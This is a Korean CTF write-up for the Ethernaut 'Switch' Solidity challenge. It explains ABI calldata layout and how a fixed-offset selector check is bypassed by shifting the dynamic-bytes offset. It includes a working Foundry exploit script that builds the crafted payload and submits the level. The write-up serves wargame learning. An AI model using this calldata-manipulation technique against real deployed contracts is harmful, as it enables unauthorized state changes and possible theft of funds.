---
title: "Ethernaut 29 Switch"
published: 2026-05-07
description: "Ethernaut 29 Switch 문제 풀이."
category: "CTF/Wargame"
tags: ["Web3", "Ethernaut", "Writeup"]
listed: false
---

## 문제
### 지문
Just have to flip the switch. Can't be that hard, right?
Things that might help:
Understanding how CALLDATA is encoded.
### 코드
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```
## 배경지식

---

Solidity 함수 호출 calldata는 앞 4바이트의 함수 selector 뒤에 인자들이 ABI 규칙대로 붙는다. `bytes`, `string`, 동적 배열 같은 동적 타입은 head 영역에 실제 데이터가 바로 들어가지 않고, tail 영역을 가리키는 offset이 들어간다.
`flipSwitch(bytes)`를 정상적으로 호출하면 구조는 대략 다음과 같다.
```plain text
0x00 ~ 0x03: flipSwitch(bytes) selector
0x04 ~ 0x23: _data offset = 0x20
0x24 ~ 0x43: _data length
0x44 ~     : _data bytes
```
여기서 offset은 함수 selector를 제외한 인자 영역의 시작, 즉 byte `4`를 기준으로 계산된다. 따라서 offset이 `0x20`이면 실제 length 위치는 `4 + 0x20 = 36`이고, `_data`의 첫 바이트 위치는 `36 + 32 = 68`이 된다.

---

함수 selector는 함수 시그니처를 `keccak256`으로 해싱한 값의 앞 4바이트다.
```solidity
bytes4(keccak256("flipSwitch(bytes)"));
bytes4(keccak256("turnSwitchOff()"));
bytes4(keccak256("turnSwitchOn()"));
```
`address(this).call(_data)`는 `_data`의 앞 4바이트를 selector로 보고 현재 컨트랙트의 함수를 다시 호출한다. 최종적으로 실행되어야 하는 `_data`는 `turnSwitchOn()` selector로 시작해야 한다.
## 문제 코드 분석

---

먼저 `onlyThis`를 보자.
```solidity
modifier onlyThis() {
    require(msg.sender == address(this), "Only the contract can call this");
    _;
}

function turnSwitchOn() public onlyThis {
    switchOn = true;
}

function turnSwitchOff() public onlyThis {
    switchOn = false;
}
```
`turnSwitchOn()`과 `turnSwitchOff()`는 직접 호출할 수 없다. 외부 계정이나 공격 컨트랙트가 바로 호출하면 `msg.sender`가 `Switch` 컨트랙트 자신이 아니므로 revert된다.
따라서 이 문제에서는 `flipSwitch()` 안의 `address(this).call(_data)`를 통해 `Switch` 컨트랙트가 자기 자신을 호출하게 만들어야 한다.

---

이제 `onlyOff`의 고정 위치 검사를 보자.
```solidity
modifier onlyOff() {
    bytes32[1] memory selector;
    assembly {
        calldatacopy(selector, 68, 4)
    }
    require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
    _;
}
```
`onlyOff`는 calldata의 byte `68`에서 4바이트를 읽고, 그 값이 `turnSwitchOff()` selector인지 검사한다. 정상 ABI 인코딩에서는 `_data`의 첫 4바이트가 정확히 byte `68`에 오므로, 이 검사는 `_data`가 `turnSwitchOff()`로 시작하는지 확인하는 것처럼 보인다.
문제는 `68`이라는 위치를 고정으로 믿고 있다는 점이다. 실제 `_data`의 위치는 calldata 안의 offset 값으로 결정된다. 즉, offset을 바꾸면 `onlyOff`가 검사하는 위치와 ABI 디코더가 `_data`로 해석하는 위치를 다르게 만들 수 있다.

---

마지막으로 `flipSwitch`의 내부 호출을 보자.
```solidity
function flipSwitch(bytes memory _data) public onlyOff {
    (bool success,) = address(this).call(_data);
    require(success, "call failed :(");
}
```
`onlyOff`만 통과하면 `flipSwitch`는 ABI 디코딩된 `_data`를 그대로 `address(this).call(_data)`에 넣는다. 따라서 calldata의 byte `68`에는 `turnSwitchOff()` selector를 넣어 검사를 통과시키고, 실제 `_data` 위치에는 `turnSwitchOn()` selector를 넣으면 된다.
## 풀이
`onlyOff`는 byte `68`만 본다. 하지만 `flipSwitch(bytes)`의 `_data`는 calldata에 들어 있는 offset을 따라간다. byte `68`에는 검사 통과용 `turnSwitchOff()` selector를 두고, offset을 `0x60`으로 밀어서 실제 `_data`는 더 뒤쪽의 `turnSwitchOn()` selector를 가리키게 만들면 된다.
구성은 다음과 같다.
```plain text
0x00 ~ 0x03: flipSwitch(bytes) selector
0x04 ~ 0x23: _data offset = 0x60
0x24 ~ 0x43: dummy 32 bytes
0x44 ~ 0x63: turnSwitchOff() selector + padding
0x64 ~ 0x83: _data length = 4
0x84 ~ 0xa3: turnSwitchOn() selector + padding
```
byte `0x44`는 10진수로 `68`이다. 따라서 `onlyOff`는 여기 있는 `turnSwitchOff()` selector를 읽고 통과한다. 반면 ABI 디코더는 offset `0x60`을 보고 byte `4 + 0x60 = 100`, 즉 `0x64` 위치를 `_data` length로 해석한다. length가 `4`이므로 실제 `_data`는 바로 다음 4바이트인 `turnSwitchOn()` selector가 된다.
내부 호출은 `address(this).call(hex"turnSwitchOn selector")`가 되고, 이 호출의 `msg.sender`는 `Switch` 컨트랙트 자신이므로 `onlyThis`도 통과한다.

---

아래 코드는 인스턴스 생성, payload 전송, 제출까지 한 번에 처리한 Foundry 스크립트다. 새 인스턴스 주소를 `SwitchFactory`의 nonce로 미리 계산한 뒤, `_flipSwitchPayload()`로 만든 calldata를 보낸다.
`createLevelInstance()` 내부에서 `SwitchFactory.createInstance()`가 `new Switch()`를 실행하므로, 인스턴스 주소는 `computeCreateAddress(SWITCH_LEVEL, factoryNonce)`로 계산할 수 있다.
### 익스플로잇
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Script.sol";

interface IEthernaut29 {
    function createLevelInstance(address level) external payable;
    function submitLevelInstance(address payable instance) external;
}

interface ISwitch {
    function switchOn() external view returns (bool);
}

contract Sol29Delegation {
    address private immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    function solve(address ethernaut, address switchLevel, uint256 factoryNonce, uint256 createGas)
        external
        onlyOwner
        returns (address instance)
    {
        instance = _computeCreateAddress(switchLevel, factoryNonce);

        IEthernaut29(ethernaut).createLevelInstance{gas: createGas}(switchLevel);

        (bool ok,) = instance.call(_flipSwitchPayload());
        require(ok, "flipSwitch failed");
        require(ISwitch(instance).switchOn(), "switch is still off");

        IEthernaut29(ethernaut).submitLevelInstance(payable(instance));
    }

    function _flipSwitchPayload() private pure returns (bytes memory) {
        bytes4 flip = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 off = bytes4(keccak256("turnSwitchOff()"));
        bytes4 on = bytes4(keccak256("turnSwitchOn()"));

        return abi.encodePacked(
            flip,
            uint256(96),
            uint256(0),
            off,
            bytes28(0),
            uint256(4),
            on,
            bytes28(0)
        );
    }

    function _computeCreateAddress(address deployer, uint256 nonce) private pure returns (address) {
        if (nonce == 0) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80))))));
        }
        if (nonce <= 0x7f) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce))))));
        }
        if (nonce <= type(uint8).max) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), uint8(nonce))))));
        }
        if (nonce <= type(uint16).max) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes1(0x82), uint16(nonce))))));
        }
        if (nonce <= type(uint24).max) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes1(0x83), uint24(nonce))))));
        }
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes1(0x84), uint32(nonce))))));
    }
}

contract Sol29 is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);
        IEthernaut29 ethernaut = IEthernaut29(vm.envAddress("ETHERNAUT_INSTANCE"));
        address switchLevel = vm.envAddress("SWITCH_LEVEL");
        uint256 createGas = vm.envOr("SWITCH_CREATE_GAS", uint256(1_000_000));
        uint256 factoryNonce = vm.envOr("SWITCH_FACTORY_NONCE", uint256(vm.getNonce(switchLevel)));

        vm.broadcast(privateKey);
        Sol29Delegation implementation = new Sol29Delegation(player);

        vm.broadcast(privateKey);
        vm.signAndAttachDelegation(address(implementation), privateKey);
        Sol29Delegation(payable(player)).solve(address(ethernaut), switchLevel, factoryNonce, createGas);
    }
}

contract Sol29Clear is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.signAndAttachDelegation(address(0), privateKey);
        vm.broadcast(privateKey);
        (bool success,) = payable(address(0)).call("");
        require(success, "clear delegation failed");
    }
}
```
![screenshot](./image-1.png)
